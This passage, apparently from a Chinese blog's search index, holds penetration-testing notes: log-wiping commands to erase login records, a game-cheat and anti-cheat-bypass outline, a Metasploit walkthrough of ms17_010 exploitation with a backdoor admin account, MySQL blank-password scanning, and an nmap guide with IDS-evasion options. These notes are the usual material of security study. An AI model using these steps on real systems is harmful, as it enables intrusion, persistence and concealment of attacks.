/var/log/btmp<br><strong>访问成功的日志</strong><br>echo &gt; /var/log/wtmp （此时执行 last 命令就会发现没有记录）<br><strong>删除日志记录</strong>：</p><p> echo &gt; /var/log/secure</p><p><strong>执行时注意文件是否有执行权限。而且删除日志一般只有root 权限才可以。</strong></p>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali，msf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>游戏安全</title>
      <link href="/2021/07/16/re/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8/"/>
      <url>/2021/07/16/re/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="游戏外挂"><a href="#游戏外挂" class="headerlink" title="游戏外挂"></a>游戏外挂</h1><p>1.过保护 TP/NP/BE/GDK/X3</p><p>2.数据分析 属性/call/漏洞</p><p>3.研发 外挂代码逻辑</p><p>4.过检测 模块检测，数据检测，CRC检测，封包检测，堆栈检测，文件检测，特征检测</p><p><strong>开发</strong></p><p>编程语言，c++/易语言</p><p>系统编程 Win32 api PE结构</p><p>界面编程 MFC QT 易语言</p><p>+-安全技能</p><p>软件逆向 数据分析 漏洞挖掘</p><p>内核安全 保护模式 调试与异常 驱动研发 VT硬件虚拟化</p>]]></content>
      
      
      <categories>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit渗透测试框架的基本使用</title>
      <link href="/2021/07/16/Linux%E5%AD%A6%E4%B9%A0/kali/msf/"/>
      <url>/2021/07/16/Linux%E5%AD%A6%E4%B9%A0/kali/msf/</url>
      
        <content type="html"><![CDATA[<h1 id="metasploit-渗透测试框架介绍"><a href="#metasploit-渗透测试框架介绍" class="headerlink" title="metasploit 渗透测试框架介绍"></a>metasploit 渗透测试框架介绍</h1><p>1.基础库： metasploit 基础库文件位于源码根目录路径下的 libraries 目录中，包括<br>Rex,framework core 和 framework base 三部分。</p><p>2.模块：模块组织按照不同的用途分为 6 种类型的模块（ Modules<br>分为辅助模块（Aux）、渗透攻击模块（ Exploits) 、后渗透攻击模块（ Post) 、攻击载荷模块<br>payloads) 、编码器模块（ Encoders) 、空指令模块（ Nops) 。</p><p>3.插件：插件能够扩充框架的功能，或者组装已有功能构成高级特性的组件。插件可以集成现有的一些外部安全工具，如Nessus 、 OpenVAS 漏洞扫描器等，为用户接口提供一些新的功能。</p><p>4.接口：包括 msfconsole 控制终端、 msfcli 命令行、 msfgui 图形化界面、 armitage 图形化界<br>面以及 msfapi 远程调用接口。</p><p>5.功能程序： metasploit 还提供了一系列可直接运行的功能程序，支持渗透测试者与安全人员快<br>速地利用 metasploit 框架内部能力完成一些特定任务。比如 msfpayload 、 msfencode 和<br>msfvenom 可以将攻击载荷封装为可执行文件、 C 语言、 JavaScript 语言等多种形式，并可以进行各种<br>类型的编码。</p><p>Metasploit程序需要使用 Postgresql 数据库。<br>PostgreSQL是一种特性非常齐全的自由软件的对象 关系型数据库管理系统（ ORDBMS ），是以加州大学计算机系开发的 POSTGRES 4.2 版本为基础的对象关系型数据库管理系统。</p><p>Core Commands<br>核心命令<br>Module Commands<br>模块命令<br>Job Commands<br>后台任务命令<br>Resource Script Commands<br>资源脚本命令<br>Database Backend Commands<br>数据库后端命令<br>Credentials Backend Commands<br>证书 凭证后端命令<br>Developer Commands<br>开发人员命令</p><p>1.核心命令中的 connect 命令</p><p>connect 命令主要用于远程连接主机。一般用于内网渗透。比较常用的命令就是“ connect<br>19 2.168.1.1 80</p><p><img src="https://raw.githubusercontent.com/Phantomor/images/main/img/kali/msfmsf.png" alt="connect"></p><p>2.模块相关的命令 show 使用方法<br>show命令用的很多。<br>有效参数是 all, encoders, nops, exploits, payloads, auxiliary, post，plugins, info, options<br>例1 ：列出 metasploit 框架中的 所有渗透攻击模块 exploits 。<br>msf6 &gt; show exploits</p><p>3.模块相关的命令 search 搜索的使用方法</p><h1 id="matesploit-framework功能"><a href="#matesploit-framework功能" class="headerlink" title="matesploit framework功能"></a>matesploit framework功能</h1><ul><li><p>信息搜集</p></li><li><p>漏洞探测</p></li><li><p>漏洞利用</p></li><li><p>权限提升</p></li><li><p>内网渗透</p></li><li><p>权限维持</p></li><li><p>痕迹清除</p></li></ul><h2 id="ms17-010漏洞复现"><a href="#ms17-010漏洞复现" class="headerlink" title="ms17_010漏洞复现"></a>ms17_010漏洞复现</h2><p><strong>1&gt;模块相关的命令 use 的使用方法</strong><br>use使用参数。如你要使用到某个模块，就要使用到 use 命令</p><p>search ms17_010</p><p>use ms17_010</p><p>info</p><p>从弹出的消息中，需要重点关注的内容是：</p><p>1.可用目标 就是查看可以攻击哪些操作系统</p><p>2.Basic options: 调用 漏洞 需要的相关参数</p><p>3.漏洞 描述和执行过程： </p><p>4.参考文档</p><p><strong>2&gt;.使用 show 命令查看模块的相关信息</strong></p><p>show options 查看模块的选项</p><p>mb/ms08_067_netapi) &gt; show targets 查看可以攻击哪些操作系统</p><p>设置RHOSTS 参数，指定攻击的目标机器<br>set RHOSTS 192.168.3.28</p><p>search windows/x64/shell type:payload</p><p>set payload 名字</p><p>net user admin admin /add</p><p>chcp 65001</p><p>net user</p><p>exploit -j 表示后台执行</p><p>session -i 2</p><p>background 转移到后台</p><p>sessions</p><p>sessions -k 2 结束会话</p><p><strong>总结使用</strong><br>metasploit 攻击的步骤：<br>1.查找 CVE 公布的漏洞<br>2.查找对应的 exploit 模块<br>3.配置模块参数<br>4.添加 payload 后门<br>5.执行 exploit 开始攻击</p><h2 id="msf扫描靶机上的mysql服务的空密码"><a href="#msf扫描靶机上的mysql服务的空密码" class="headerlink" title="msf扫描靶机上的mysql服务的空密码"></a>msf扫描靶机上的mysql服务的空密码</h2><p>登录Metasploitable2 Linux</p><p>msf6 &gt; use auxiliary/scanner/mysql/mysql_login </p><p>msf6 auxiliary(scanner/mysql/mysql_login) &gt; set USERNAME root<br>USERNAME =&gt; root<br>msf6 auxiliary(scanner/mysql/mysql_login) &gt; set BLANK_PASSWORDS true  为所有用户尝试空密码<br>BLANK_PASSWORDS =&gt; true<br>msf6 auxiliary(scanner/mysql/mysql_login) &gt; set RHOSTS 192.168.3.27<br>RHOSTS =&gt; 192.168.3.27</p><p>使用后端凭证命令 creds 列出数据库中的所有凭据<br>Credentials凭证 证书<br>msf6 auxiliary(scanner/mysql/mysql_login) &gt; creds</p><p><strong>数据库后端命令</strong><br>db_connect 连接到现有的数据库<br>db_disconnect 断开与当前数据库实例的连接<br>db_export 导出包含数据库内容的文件<br>db_import 导入扫描结果文件（文件类型将被自动检测）</p><p><strong>将前面扫描 mysql 数据库空密码信息导出</strong><br>msf6 auxiliary(scanner/mysql/mysql_login) &gt; db_export f xml /root/bak.xml</p><p>注：导出只支持两种格式：xml 和 pwdump</p><p>常用的导出格式为xml</p><p>msfdb reinit 重置数据库</p><p>msfconsole 开msf</p><p>db_import /root/bak.xml</p><p>msf6 &gt; hosts</p><p>c 此 选项 使我们能够选择要用 hosts 命令显示的数据的列或字段,类似于 SQL 中的 select 命令,在上图中可以看到显示的可用列。</p><p>msf6 &gt; hosts c address,name,os_name</p><p>删除指定主机<br>msf6 &gt; hosts d 192.168.1.180</p><p>我们还可以直接将<strong>NMAP 的扫描结果导入到 Metasploit 数据库</strong>中我们新开一个终端窗口来进行扫描。</p><p><code>nmap -A baidu.com -oX baidu.xml</code><br>-oX 将扫描信息导出到 XML 文件中</p><p>db_import /root/baidu.xml</p><p>hosts</p><p>services</p><p>msf6 &gt; services -R 39.156.69.76</p><h1 id="msf-命令"><a href="#msf-命令" class="headerlink" title="msf 命令"></a>msf 命令</h1><p>msf6 &gt; help</p><p><strong>核心命令</strong></p><p>？帮助菜单<br>banner 显示一个 metasploit 横幅<br>cd 更改当前的工作目录<br>color 切换颜色<br>connect 连接与主机通信<br>exit 退出控制台<br>get 获取特定于上下文的变量的值<br>getg 获取全局变量的值<br>grep grep 另一个命令的输出 如： grep creds help<br>help 帮助菜单<br>history 显示命令历史<br>irb 进入 irb 脚本模式<br>load 加载一个框架插件<br>quit 退出控制台<br>route 通过会话路由流量<br>save 保存活动的数据存储<br>sessions 转储会话列表并显示有关会话的信息<br>set 将特定于上下文的变量设置为一个值<br>setg 将全局变量设置为一个值<br>sleep 在指定的秒数内不做任何事情<br>spool 将控制台输出写入文件以及屏幕<br>threads 线程查看和操作后台线程<br>unload 卸载框架插件<br>unset 取消设置一个或多个特定于上下文的变量<br>unsetg 取消设置一个或多个全局变量<br>version 显示框架和控制台库版本号<br><strong>模块命令</strong></p><p>advanced 显示一个或多个模块的高级选项<br>back 从当前上下文返回<br>edit 使用首选编辑器编辑当前模块<br>info 显示有关一个或多个模块的信息</p><p>loadpath 路径从路径搜索并加载模块<br>options 显示全局选项或一个或多个模块<br>popm 将最新的模块从堆栈中弹出并使其处于活动状态<br>previous 将之前加载的模块设置为当前模块<br>pushm 将活动或模块列表推入模块堆栈<br>reload_all 从所有定义的模块路径重新加载所有模块<br>search 搜索模块名称和描述<br>show 显示给定类型的模块或所有模块<br>use 按名称选择模块<br><strong>工作命令</strong></p><p>handler 作为作业启动负载处理程序<br>jobs显示和管理作业<br>kill 杀死一个工作</p><p>rename_job 重命名作业</p><p><strong>资源脚本命令</strong></p><p>makerc 保存从开始到文件输入的命令<br>resource 运行存储在文件中的命令</p><p><strong>数据库后端命令</strong></p><p>db_connect 连接到现有的数据库<br>db_disconnect 断开与当前数据库实例的连接<br>db_export 导出包含数据库内容的文件<br>db_import 导入扫描结果文件（文件类型将被自动检测）<br>db_nmap 执行 nmap 并自动记录输出</p><p>db_rebuild_cache 重建数据库存储的模块高速缓存<br>db_status 显示当前的数据库状态<br>hosts 列出数据库中的所有主机<br>loot 列出数据库中的所有战利品<br>notes 列出数据库中的所有笔记<br>services 列出数据库中的所有服务<br>vulns 列出数据库中的所有漏洞<br>workspace 在数据库工作区之间切换</p><p><strong>凭证后端命令</strong></p><p>creds 列出数据库中的所有凭据</p>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali，msf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap的使用技巧&lt;1&gt;</title>
      <link href="/2021/07/15/Linux%E5%AD%A6%E4%B9%A0/kali/nmap%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
      <url>/2021/07/15/Linux%E5%AD%A6%E4%B9%A0/kali/nmap%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<p><a href="https://nmap.org/man/zh/index.htm">nmap参考指南</a></p><h1 id="简单介绍nmap"><a href="#简单介绍nmap" class="headerlink" title="简单介绍nmap"></a>简单介绍nmap</h1><p>Nmap (“Network Mapper(网络映射器)”) 是一款开放源代码的 网络探测和安全审核的工具主机检测工具</p><ul><li><p>检测活在网络上的主机（主机发现）</p></li><li><p>检测主机上开放的端口（端口发现或枚举）</p></li><li><p>检测到相应的端口（服务发现）的软件和版本</p></li><li><p>检测操作系统，硬件地址，以及软件版本</p></li><li><p>检测脆弱性的漏洞（Nmap的脚本）</p></li></ul><p>命令：**<code>nmap</code> [ <em><code>&lt;扫描类型&gt;</code></em> …] [ <em><code>&lt;选项&gt;</code></em> ] { <em><code>&lt;扫描目标说明&gt;</code></em> }**</p><p>#nmap 192.168.3.1 扫描主机 简单扫描 1-1000端口</p><p>#nmap 192.168.3.1 扫描整个子网</p><p>#nmap 可以执行多个目标</p><p>#nmap -sL 192.168.1.1/24如果你想看到你扫描的所有主机的列表</p><p>#nmap -p80,21,23 192.168.1.1  扫描端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nmap端口状态解析</span><br><span class="line">open： 应用程序在该端口接收 TCP 连接或者 UDP 报文。 </span><br><span class="line">closed ：关闭的端口对于nmap也是可访问的， 它接收nmap探测报文并作出响应。但没有应用程序在其上监听。</span><br><span class="line">filtered ：由于包过滤阻止探测报文到达端口，nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由规则 或者主机上的软件防火墙。</span><br><span class="line">unfiltered ：未被过滤状态意味着端口可访问，但是nmap无法确定它是开放还是关闭。 只有用于映射防火墙规则集的 ACK 扫描才会把端口分类到这个状态。</span><br><span class="line">open| filtered ：无法确定端口是开放还是被过滤， 开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃了探测报文或者它引发的任何反应。UDP，IP协议,FIN, Null等扫描会引起。</span><br><span class="line">closed|filtered：（关闭或者被过滤的）：无法确定端口是关闭的还是被过滤的</span><br></pre></td></tr></table></figure><p>除了端口表，Nmap还能提供关于目标机的进一步信息，包括<strong>反向域名，操作系统猜测，设备类型，和MAC地址。</strong></p><h1 id="选项概要"><a href="#选项概要" class="headerlink" title="选项概要"></a>选项概要</h1><p><a href="https://svn.nmap.org/nmap/docs/nmap.usage.txt">nmap最新选项</a></p><h2 id="target-specification-目标说明"><a href="#target-specification-目标说明" class="headerlink" title="target specification(目标说明)"></a>target specification(目标说明)</h2><p>can pass hostnames, Ip addresses,networks,etc</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  -iL &lt;inputfilename&gt;: Input from list of hosts/networks</span><br><span class="line"><span class="meta">#</span><span class="bash">nmap -iL target.txt  如果你有一个ip地址列表，将这个保存为一个txt文件，和namp在同一目录下,扫描这个txt内的所有主机</span></span><br><span class="line">  -iR &lt;num hosts&gt;: Choose random targets (随机选择目标)</span><br><span class="line">eg: nmap -iR 5#随机5个目标扫描</span><br><span class="line">  --exclude &lt;host1[,host2][,host3],...&gt;: Exclude hosts/networks</span><br><span class="line">  --excludefile &lt;exclude_file&gt;: Exclude list from file</span><br><span class="line"><span class="meta">#</span><span class="bash">nmap 192.168.1.1/24 -exclude 192.168.1.1 排除192.168.1.1扫描其他网络</span></span><br><span class="line"><span class="meta">#</span><span class="bash">nmap 192.168.1.1/24 -excludefile target.txt ?报错</span></span><br><span class="line"><span class="meta">#</span><span class="bash">I cannot figure out what <span class="built_in">source</span> address to use <span class="keyword">for</span> device xcluce, does it even exist?</span></span><br><span class="line"><span class="meta">#</span><span class="bash">QUITTING!</span></span><br></pre></td></tr></table></figure><h2 id="HOST-DISCOVERY-发现主机"><a href="#HOST-DISCOVERY-发现主机" class="headerlink" title="HOST DISCOVERY(发现主机):"></a>HOST DISCOVERY(发现主机):</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">-sL: 列表扫描 - 简单列出要扫描的目标</span><br><span class="line">-sP: Ping 扫描 - 只需确定主机是否在线</span><br><span class="line">-P0：将所有主机视为online -- 跳过主机发现</span><br><span class="line">-PS/PA/PU [portlist]: TCP SYN/ACK 或 UDP 发现探测到给定的端口</span><br><span class="line">-PE/PP/PM：ICMP 回显、时间戳和网络掩码请求发现探测</span><br><span class="line">-n/-R：从不进行 DNS 解析/始终解析 [默认：有时解析]</span><br></pre></td></tr></table></figure><p><strong>-sL (列表扫描)</strong></p><p>列表扫描是主机发现的退化形式，它仅仅列出指定网络上的每台主机， 不发送任何报文到目标主机。默认情况下，Nmap仍然对主机进行反向域名解析以获取 它们的名字</p><p>既然只是打印目标主机的列表，像其它一些高级功能如端口扫描，操作系统探测或者Ping扫描 的选项就没有了。如果您希望关闭ping扫描而仍然执行这样的高级功能，请阅读关于 <code>-P0</code>选项的介绍。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 部分</span></span><br><span class="line">Nmap scan report for 192.168.3.254</span><br><span class="line">Nmap scan report for 192.168.3.255</span><br><span class="line">Nmap done: 256 IP addresses (0 hosts up) scanned in 4.07 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>-sP(Ping扫描)</strong></p><p>该选项告诉Nmap仅仅进行ping扫描，然后打印出对扫描做出响应的那些主机。没有进一步的测试 (如端口扫描或者操作系统探测)。 这比列表扫描更积极，常常用于和列表扫描相同的目的。它可以得到些许目标网络的信息而不被特别注意到。 对于攻击者来说，了解多少主机正在运行比列表扫描提供的一列IP和主机名往往更有价值。</p><p>系统管理员往往也很喜欢这个选项。 它可以很方便地得出 网络上有多少机器正在运行或者监视服务器是否正常运行。常常有人称它为 地毯式ping，<strong>它比ping广播地址更可靠，因为许多主机对广播请求不响应。</strong></p><p><code>-sP</code>选项在默认情况下， 发送一个ICMP回声请求和一个TCP报文到80端口。如果非特权用户执行，就发送一个SYN报文 (用<code>connect()</code>系统调用)到目标机的80端口。 当特权用户扫描局域网上的目标机时，会发送ARP请求(<code>-PR</code>)， ，除非使用了<code>--send-ip</code>选项。 <code>-sP</code>选项可以和除<code>-P0</code>)之外的任何发现探测类型<code>-P*</code> 选项结合使用以达到更大的灵活性。 一旦使用了任何探测类型和端口选项，默认的探测(ACK和回应请求)就被覆盖了。 当防守严密的防火墙位于运行Nmap的源主机和目标网络之间时， 推荐使用那些高级选项。否则，当防火墙捕获并丢弃探测包或者响应包时，一些主机就不能被探测到。</p><p>PING扫描需要ROOT权限，如果用户没有ROOT权限,PING扫描将会使用connect()调用.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">部分</span></span><br><span class="line">Nmap scan report for 192.168.3.23</span><br><span class="line">Host is up (0.00043s latency).</span><br><span class="line">MAC Address: xxx (Intel Corporate)</span><br><span class="line">Nmap scan report for 192.168.3.24</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (5 hosts up) scanned in 1.95 seconds</span><br></pre></td></tr></table></figure><p><strong>-P0 (无ping)</strong></p><p>该选项完全跳过Nmap发现阶段。 通常Nmap在进行高强度的扫描时用它确定正在运行的机器。 默认情况下，Nmap只对正在运行的主机进行高强度的探测如 端口扫描，版本探测，或者操作系统探测。用<code>-P0</code>禁止 主机发现会使Nmap对<em>每一个</em>指定的目标IP地址 进行所要求的扫描。所以如果在命令行指定一个B类目标地址空间(/16)， 所有 65,536 个IP地址都会被扫描。 <code>-P0</code>的第二个字符是数字0而不是字母O。 和列表扫描一样，跳过正常的主机发现，但不是打印一个目标列表， 而是继续执行所要求的功能，就好像每个IP都是活动的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 部分</span></span><br><span class="line">Nmap scan report for 192.168.3.24</span><br><span class="line">Host is up (0.0000020s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong><code>-PS [portlist]</code> (TCP SYN Ping)</strong></p><p>该选项发送一个设置了SYN标志位的空TCP报文。 默认目的端口为80 (可以通过改变<code>nmap.h</code>) 文件中的DEFAULT-TCP-PROBE-PORT值进行配置，但不同的端口也可以作为选项指定。 甚至可以指定一个以逗号分隔的端口列表(如 <code>-PS22，23，25，80，113，1050，35000</code>)， 在这种情况下，每个端口会被并发地扫描。</p><p>SYN标志位告诉对方您正试图建立一个连接。 通常目标端口是关闭的，一个RST (复位) 包会发回来。 如果碰巧端口是开放的，目标会进行TCP三步握手的第二步，回应 一个SYN/ACK TCP报文。然后运行Nmap的机器则会扼杀这个正在建立的连接， 发送一个RST而非ACK报文，否则，一个完全的连接将会建立。 RST报文是运行Nmap的机器而不是Nmap本身响应的，因为它对收到 的SYN/ACK感到很意外。</p><p>Nmap并不关心端口开放还是关闭。 无论RST还是SYN/ACK响应都告诉Nmap该主机正在运行。</p><p>在UNIX机器上，通常只有特权用户 <code>root</code> 能否发送和接收 原始的TCP报文。因此作为一个变通的方法，对于非特权用户， Nmap会为每个目标主机进行系统调用connect()，它也会发送一个SYN 报文来尝试建立连接。如果connect()迅速返回成功或者一个ECONNREFUSED 失败，下面的TCP堆栈一定已经收到了一个SYN/ACK或者RST，该主机将被 标志位为在运行。 如果连接超时了，该主机就标志位为down掉了。这种方法也用于IPv6 连接，因为Nmap目前还不支持原始的IPv6报文。</p><h2 id="扫描技术"><a href="#扫描技术" class="headerlink" title="扫描技术"></a>扫描技术</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">扫描技术：</span><br><span class="line">  -sS/sT/sA/sW/sM： TCP SYN/Connect()/ACK/Window/Maimon 扫描</span><br><span class="line">  -sN/sF/sX：TCP Null、FIN 和 Xmas 扫描</span><br><span class="line">  --scanflags &lt;flags&gt;：自定义 TCP 扫描标志</span><br><span class="line">  -sI &lt;zombie host[:probeport]&gt;： Idlescan</span><br><span class="line">  -sO：IP 协议扫描</span><br><span class="line">  -b &lt;ftp 中继主机&gt;：FTP 反弹扫描</span><br></pre></td></tr></table></figure><p><strong>tcp SYN Scan (sS) SYN半连接扫描</strong></p><p>半开放扫描，因为这种技术使得Nmap不需要通过完整的握手，就能获得远程主机的信息。Nmap发送SYN包到远程主机，但是它不会产生任何会话.因此不会在目标主机上产生任何日志记录,因为没有形成会话。这个就是SYN扫描的优势.</p><p>如果nmap没有指出扫描类型默认是 Tcp SYN 但他需要root/administrator</p><p>#nmap -sS 192.168.1.1</p><p><strong>tcp connect() scan(sT) TCP全连接扫描</strong></p><p>Tcp connect()扫描需要完成三次握手,并且要求调用系统的connect().Tcp connect()扫描技术只适用于找出TCP和UDP端口.</p><p>#nmap -sT 192.168.1.1</p><p><strong>UDP scan (sU)</strong></p><p>寻找目标主机打开的UDP端口.它不需要发送任何的SYN包，针对UDP端口的。UDP扫描发送UDP数据包到目标主机，并等待响应,如果返回ICMP不可达的错误消息，说明端口是关闭的，如果得到正确的适当的回应，说明端口是开放的.</p><p>#nmap -sU 192.168.1.1</p><p><strong>FIN scan(sF)</strong></p><p>有时候Tcp SYN扫描不是最佳的扫描模式,因为有防火墙的存在.目标主机有时候可能有IDS和IPS系统的存在,防火墙会阻止掉SYN数据包。发送一个设置了FIN标志的数据包并不需要完成TCP的握手.</p><p>FIN扫描也不会在目标主机上创建日志(FIN扫描的优势之一).个类型的扫描都是具有差异性的,FIN扫描发送的包只包含FIN标识,NULL扫描不发送数据包上的任何字节,XMAS扫描发送FIN、PSH和URG标识的数据包.</p><p><strong>version scan(sV)</strong></p><p>不过它需要从开放的端口获取信息来判断软件的版本.使用版本检测扫描之前需要先用TCP SYN扫描开放了哪些端口.</p><p><strong>idle scan(sL)</strong></p><p>Idle scan是一种先进的扫描技术，它不用你真实的主机Ip发送数据包，而是使用另外一个目标网络的主机发送数据包.</p><p>Idle scan是一种理想的匿名扫描技术,通过目标网络中的192.168.1.6向主机192.168.1.1发送数据，来获取192.168.1.1开放的端口</p><p>有需要其它的扫描技术，如 FTP bounce（FTP反弹）, fragmentation scan（碎片扫描）, IP protocol scan（IP协议扫描）,以上介绍的是几种最主要的扫描方式.</p><p><strong>os检测(O)</strong></p><p>Nmap有一个名为的nmap-OS-DB数据库，  Nmap把TCP和UDP数据包发送到目标机器上，然后检查结果和数据库对照。</p><p>Nmap的操作系统指纹识别技术：</p><ul><li><p>设备类型（路由器，工作组等）</p></li><li><p>运行（运行的操作系统）</p></li><li><p>操作系统的详细信息（操作系统的名称和版本）</p></li><li><p>网络距离（目标和攻击者之间的距离跳）</p></li></ul><p>如果远程主机有防火墙，IDS和IPS系统，你可以使用-PN命令来确保不ping远程主机，因为有时候防火墙会组织掉ping请求.-PN命令告诉Nmap不用ping远程主机。</p><p>#nmap -O -PN 192.168.1.1/24</p><p><strong>PN参数可以绕过ping 命令 但不影响主机的系统发现</strong></p><p>OS Scan的结果是不可靠的，因为没有发现至少一个开放或者关闭的端口.应该是远程主机做了针对操作系统检测的防范。如果Nmap不能检测到远程操作系统类型，那么就没有必要使用**-osscan_limit**检测。</p><p><strong>#nmap -O –osscan-guess 192.168.1.1</strong></p><h2 id="端口规范和扫描："><a href="#端口规范和扫描：" class="headerlink" title="端口规范和扫描："></a>端口规范和扫描：</h2><p>-p &lt;端口范围&gt;：仅扫描指定端口</p><p>EX：-P22; -P1-65535; -P U：53,111,137，T：21-25,80,139,8080 </p><p>-f：快速 - 仅扫描NMAP-Services文件中列出的端口</p><p>-R：连续扫描端口 - 不要随机化</p><h2 id="服务-版本检测："><a href="#服务-版本检测：" class="headerlink" title="服务/版本检测："></a>服务/版本检测：</h2><p> -sV：探测开放端口以确定服务/版本信息<br> –version-light：限制最可能的探测以更快识别<br> –version-all：尝试每个用于版本检测的单个探测器<br> –version-trace：显示详细的版本扫描活动（用于调试）</p><h2 id="操作系统检测："><a href="#操作系统检测：" class="headerlink" title="操作系统检测："></a>操作系统检测：</h2><p> -O：启用操作系统检测<br> –osscan-limit：将操作系统检测限制为有希望的目标<br> –osscan-guess：猜测操作系统更多积极  </p><h2 id="计时和性能"><a href="#计时和性能" class="headerlink" title="计时和性能:"></a>计时和性能:</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-T[0-6]：设置计时模板（越高越快）</span><br><span class="line">--min-hostgroup/max-hostgroup &lt;size&gt;：并行主机扫描组大小</span><br><span class="line">--min-parallelism/max-parallelism &lt;numprobes&gt;：探针并行化</span><br><span class="line">--min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout &lt;msec&gt;：指定探针往返时间。</span><br><span class="line">--host-timeout &lt;msec&gt;：在这么长的时间后放弃目标</span><br><span class="line">--scan-delay/--max-scan-delay &lt;msec&gt;：调整探测器之间的延迟</span><br></pre></td></tr></table></figure><h2 id="防火墙-IDS-逃避和欺骗："><a href="#防火墙-IDS-逃避和欺骗：" class="headerlink" title="防火墙/IDS 逃避和欺骗："></a>防火墙/IDS 逃避和欺骗：</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-f; --mtu &lt;val&gt;: 分片数据包 (可选w/给定 MTU)</span><br><span class="line">-D &lt;decoy1,decoy2[,ME],...&gt;: 用诱饵隐藏扫描</span><br><span class="line">-S &lt;IP_Address&gt;: 欺骗源地址</span><br><span class="line">-e &lt;iface &gt;：使用指定的接口</span><br><span class="line">-g/--source-port &lt;</span><br><span class="line">portnum &gt;：使用给定的端口号--data-length &lt;num&gt;：将随机数据附加到发送的数据包中</span><br><span class="line">--ttl &lt;</span><br><span class="line">--spoof-mac &lt;mac 地址、前缀或供应商名称&gt;：欺骗您的 MAC 地址</span><br></pre></td></tr></table></figure><h2 id="OUTPUT："><a href="#OUTPUT：" class="headerlink" title="OUTPUT："></a>OUTPUT：</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-oN/-oX/-oS/-oG &lt;file&gt;：输出扫描结果为正常、XML、s|&lt;rIpt kIddi3 ,</span><br><span class="line">  和 Grepable 格式，分别为给定的文件名。</span><br><span class="line">-oA &lt;basename&gt;：一次以三种主要格式输出</span><br><span class="line">-v：增加详细级别（使用两次以获得更多效果）</span><br><span class="line">-d[level]：设置或增加调试级别（最多9个有意义）</span><br><span class="line">--packet-trace : 显示所有发送和接收的数据包</span><br><span class="line">--iflist: 打印主机接口和路由 (用于调试)</span><br><span class="line">--append-output: 附加到而不是破坏指定的输出文件</span><br><span class="line">--resume &lt;filename&gt;: 恢复中止的扫描</span><br><span class="line">--stylesheet &lt;path/URL&gt;：将 XML 输出转换为 HTML 的 XSL 样式表</span><br><span class="line">--no-stylesheet：防止 Nmap 将 XSL 样式表与 XML 输出关联</span><br></pre></td></tr></table></figure><h2 id="MISC："><a href="#MISC：" class="headerlink" title="MISC："></a>MISC：</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span 